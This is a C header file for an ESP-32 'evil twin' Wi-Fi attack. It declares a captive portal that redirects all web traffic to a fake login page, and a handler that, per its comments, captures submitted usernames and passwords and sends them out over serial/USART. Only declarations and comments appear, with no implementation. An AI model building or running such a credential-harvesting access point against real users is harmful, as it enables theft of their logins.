#ifndef WEB_HANDLER_H
#define WEB_HANDLER_H

extern WebServer http_server;
extern DNSServer dns_server; 

// this function setup all the routes for the evil twin. //
void setup_web_handler();

// this function activates everytime user try to navigate on web. //
// in particular, for each URL that doesn't match the ESP-32 one, //
// the user is redirected on the login page. //
void captive_portal();

// this function activates everytime the main page is visited. //
// it presents a web login interface to the user. //
void main_handler();

// this function activates everytime user submit a username-passwrd pair. //
// the credentials are written on the serial output and sent on usart. //
void submit_handler();

#endif
